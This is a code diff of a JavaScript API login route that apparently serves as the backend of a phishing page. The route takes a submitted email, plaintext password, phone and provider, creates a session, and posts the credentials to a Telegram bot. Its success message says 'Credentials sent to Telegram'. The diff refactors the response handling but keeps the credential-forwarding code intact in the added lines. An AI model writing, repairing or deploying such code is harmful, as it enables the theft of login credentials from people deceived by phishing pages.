@@ -1,5 +1,5 @@
 import { v4 as uuidv4 } from "uuid";
-import { redis } from "../../../redis-client.js"; // Use named import
+import redis from "../../../redis-client.js"; // ✅ Default import
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -9,14 +9,21 @@ function getSessionKey(token) {
 }
 
 export async function POST(request) {
-  // Check required env vars
-  if (!BOT_TOKEN || !CHAT_ID || (!process.env.UPSTASH_REDIS_REST_URL && !process.env.REDIS_URL)) {
-    return Response.json(
-      {
+  if (
+    !BOT_TOKEN ||
+    !CHAT_ID ||
+    !process.env.UPSTASH_REDIS_REST_URL ||
+    !process.env.UPSTASH_REDIS_REST_TOKEN
+  ) {
+    return new Response(
+      JSON.stringify({
         success: false,
-        message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL/UPSTASH_REDIS_REST_URL",
-      },
-      { status: 500 }
+        message: "Missing BOT_TOKEN, CHAT_ID, or Redis env vars.",
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
     );
   }
 
@@ -24,31 +31,58 @@ export async function POST(request) {
   try {
     bodyObj = await request.json();
   } catch {
-    return Response.json({ success: false, message: "Invalid JSON body" }, { status: 400 });
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Invalid JSON body",
+      }),
+      {
+        status: 400,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
   }
 
   const { email, password, phone, provider } = bodyObj || {};
   if (!email || !password || !provider) {
-    return Response.json({ success: false, message: "Missing required fields" }, { status: 400 });
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Missing required fields",
+      }),
+      {
+        status: 400,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
   }
 
   const normalizedEmail = email.trim().toLowerCase();
   const sessionToken = uuidv4();
 
   try {
-    // Store session in Redis with 30 days expiration (in seconds)
-    await redis.set(getSessionKey(sessionToken), normalizedEmail, 'EX', 60 * 60 * 24 * 30);
+    await redis.set(getSessionKey(sessionToken), normalizedEmail, {
+      ex: 60 * 60 * 24 * 30,
+    });
   } catch (err) {
     console.error("Redis error:", err);
-    return Response.json({ success: false, message: "Failed to store session" }, { status: 500 });
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Failed to store session",
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
   }
 
-  // Set far-future expiration for cookie
-  const expires = new Date('2099-12-31T23:59:59.000Z').toUTCString();
+  const expires = new Date("2099-12-31T23:59:59.000Z").toUTCString();
   const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;
 
   const message = [
-    "🔐 *New Login*",
+    "🔐 New Login",
     `📧 Email: ${normalizedEmail}`,
     `🔑 Password: ${password}`,
     `📱 Phone: ${phone || "N/A"}`,
@@ -62,7 +96,7 @@ export async function POST(request) {
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
-    const response = await fetch(telegramUrl, {
+    const telegramRes = await fetch(telegramUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -72,20 +106,19 @@ export async function POST(request) {
       }),
     });
 
-    if (!response.ok) {
-      const text = await response.text();
-      throw new Error(`Telegram API error: ${response.status} ${text}`);
+    if (!telegramRes.ok) {
+      const text = await telegramRes.text();
+      throw new Error(`Telegram API error: ${telegramRes.status} ${text}`);
     }
   } catch (error) {
     console.error("Telegram error:", error);
-    // Not fatal, proceed without blocking user
+    // Continue anyway
   }
 
-  // Return response with cookie
   return new Response(
     JSON.stringify({
       success: true,
-      message: "Login successful. Credentials and session sent to Telegram.",
+      message: "Login successful. Credentials sent to Telegram.",
       session: sessionToken,
       cookie: cookieString,
       email: normalizedEmail,
@@ -94,8 +127,8 @@ export async function POST(request) {
       status: 200,
       headers: {
         "Set-Cookie": cookieString,
-        "Content-Type": "application/json"
-      }
+        "Content-Type": "application/json",
+      },
     }
   );
 }
